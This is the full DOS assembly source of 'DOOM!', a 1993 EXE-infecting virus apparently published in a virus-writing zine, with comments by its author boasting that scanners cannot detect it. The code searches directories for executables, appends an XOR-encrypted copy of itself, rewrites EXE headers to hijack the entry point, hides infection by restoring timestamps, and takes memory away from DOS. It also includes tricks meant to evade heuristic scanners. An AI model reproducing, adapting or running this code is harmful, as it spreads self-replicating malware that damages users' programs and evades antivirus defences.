; VirusName : DOOM!
; Origin    : Sweden
; Author    : Raver
; Date      : 23/12/93

; My second scratch contribution to this issue. It's a simple non-over-
; writing, non-destructive exe-infector that "eats up" a bit memory on
; every run. It restore date/time stamps and uses an encryption routine
; to avoid discovery from virus scanners. Of'cos no virus scanners are
; able to detect it. This includes Scan/FindViru/MSAV/CPAV/F-Prot and
; TBAV's most heuristic scanner. Well, 9 out of 10 viruses, that's nothing
; but pure bullshit!, ha!, this "wanna-be" can't find a single flag in 
; this code!

; After these two moderate, educational viruses I'm planning to do some
; "fancier" memory resident viruses to the next issue. If I've got some
; time, that is. Fucking military service :)

; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
;			        DOOM!
; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä

cseg	segment byte public 'code'
	assume cs:cseg, ds:cseg

	org 100h

start_of_virus:

    call get_offset
get_offset:			;alternative way to get the delta
    mov di,sp			;offset without activating any flags in
    mov bp,word ptr ss:[di]	;TB-scan
    sub bp,offset get_offset
    inc sp
    inc sp

    push ds			;save es & ds
    push es
    push cs			;and point ds to code segment
    pop ds

    call encrypt_decrypt	;decrypt contents of file

start_of_encryption:
    cld				;clear direction flag

    mov ah,1ah			;set new dta area
    lea dx,[bp+dta_area]
    int 21h

    mov bx,es
    push cs			;es points to code segment
    pop es

    lea si,[bp+return2_buffer]	;this code prepares the return code
    lea di,[bp+return_buffer]
    movsw			;transfer buffer contents
    lodsw
    add ax,bx			;bx holds start es = psp
    add ax,10h
    stosw

;   lea di,[bp+stack_return]
;   lea si,[bp+stack_save]	;si already points to stack_save
    add di,8			;saving a byte with this code
    lodsw			;prepares the restore of ss/sp
    add ax,bx
    add ax,10h
    stosw
    movsw


    mov ah,47h			;save starting directory
    xor dl,dl
    lea si,[bp+save_dir]
    int 21h

find_new_files:			;start finding files
    mov ah,4eh
    mov cx,7
    lea dx,[bp+search_pattern]
find_files:
    int 21h

    jnc open_file		;if found a file
    lea dx,[bp+dir_mask]	;else change directory
    mov ah,3bh
    int 21h
    jnc find_new_files
    jmp no_more_files		;end of all files

open_file:			;open the found file
    mov ax,3d02h
    lea dx,[bp+dta_area+1eh]
    int 21h

    xchg ax,bx			;file handle in bx

    mov ah,3fh			;read the exe header to exe_header
    mov cx,18h
    lea dx,[bp+exe_header]
    int 21h

    lea si,[bp+exe_header]	;check if it's really a executable
    lodsw
    cmp ax,'ZM'
    je check_infected
    cmp ax,'MZ'
    je check_infected
    jmp no_exe			;else jump

check_infected:

    add si,10h			;saving another byte
;   lea si,[bp+exe_header+12h]
    lodsw
    cmp ax,'Ri'			;is it already infected?
    jne start_infect
    jmp already_infected


start_infect:
    lea di,[bp+return2_buffer]	;put the files ip/cs in return2_buffer
    movsw
    movsw

    lea si,[bp+exe_header+0eh]	;save the files ss/sp in stack_save
    movsw
    movsw

    lea di,[bp+exe_header+12h]	;mark the file infected
    mov ax,'Ri'
    stosw

    mov al,2			;go to end_of_file
    call go_eof			;dx/ax is file length at return

    mov cx,10h			;use div to save bytes instead of speed
    div cx
    sub ax,word ptr ds:[bp+exe_header+8]
    xchg dx,ax
    stosw			;put new ip/cs in exe_header
    xchg dx,ax
    stosw

    inc ax			;put new suitable ss/sp in exe_header
    inc ax
    mov word ptr [bp+exe_header+0eh],ax
    mov word ptr [bp+exe_header+10h],4b0h


    mov ah,2ch			;get system time for random number
    int 21h
    xor dh,dh			;just alter the code a little bit
    or dl,00001010b		;with encryption so TB-scan wont't
    mov word ptr [bp+encryption_value],dx   ;find garbage instruction

    mov ah,40h			;prepare to append virus to file
    lea dx,[bp+start_of_virus]
    call append_virus		;call it

    mov al,2			;go to end of file
    call go_eof

    mov cx,512			;get filesize in 512 modules
    div cx
    inc ax
    mov word ptr [bp+exe_header+2],dx	;put modulo/filesize in
    mov word ptr [bp+exe_header+4],ax	;exe header


    xor al,al			;go to beginning of file
    call go_eof

    mov ah,40h			;write new exe header
    mov cx,18h
    lea dx,[bp+exe_header]
    int 21h

    lea si,[bp+dta_area+16h]	;restore time/date stamp
    mov cx,word ptr [si]
    mov dx,word ptr [si+2]
    mov ax,5701h
    int 21h

already_infected:
no_exe:

    mov ah,3eh			;close file
    int 21h

    mov ax,4301h		;restore file attribute
    mov cl,byte ptr [bp+dta_area+15h]
    lea dx,[bp+dta_area+1eh]
    int 21h

    mov ah,4fh			;find next file
    jmp find_files

no_more_files:

    lea dx,[bp+save_dir]	;restore starting directory
    mov ah,3bh
    int 21h

    pop es			;shrink memory block
    mov ah,4ah
    mov bx,10000
    int 21h
    push es

    mov ah,48h			;allocate a new 3k block
    mov bx,192
    int 21h
    jc no_mem
    dec ax
    mov es,ax
    mov word ptr es:[1],0008h	;mark DOS as owner and it will
no_mem:				;reduce available memory to DOS

    pop es			;restore old es/ds
    pop ds

    cli				;must use this before altering ss/sp
    mov ss,word ptr cs:[bp+stack_return]    ;put back original ss/sp
    mov sp,word ptr cs:[bp+stack_return+2]
    sti				;interrupts allowed again

end_part:
db 0eah				;jmp to original ip
return_buffer db 0,0,0,0
return2_buffer dw 0,0fff0h	;code for carrier file to exit
stack_save dd ?
stack_return dd ?
dir_mask db '..',0
search_pattern db '*.exe',0
signature db "DOOM! (c) '93 Raver/Immortal Riot"
go_eof:				;procedure to go to beginning and
    mov ah,42h			;end of file
    xor cx,cx			;this saves a few bytes as it's
    cwd				;used a few times
    int 21h
    ret
end_of_encryption:
pad db 0			;pad out a byte so first byte of
				;encryption value won't be overwritten
encryption_value dw 0

encrypt_decrypt:		;cryptation routine
    mov si,word ptr [bp+encryption_value]
    lea di,[bp+start_of_encryption]
    mov cx,(end_of_encryption-start_of_encryption+1)/2
crypt_loop:
    xor word ptr [di],si
    inc di
    inc di
    loop crypt_loop
    ret

append_virus:
    call encrypt_decrypt	;encrypt virus before write
    mov cx,end_of_virus-start_of_virus	;cx is length of virus
    int 21h			;call 40h
    call encrypt_decrypt	;decrypt virus again
    ret
end_of_virus:
exe_header db 18h dup(?)		;don't need to copy this shit
dta_area db 43 dup(?)			;to the next file to infect
save_dir db 64 dup(?)			;return adress is already saved!
cseg ends
end start_of_virus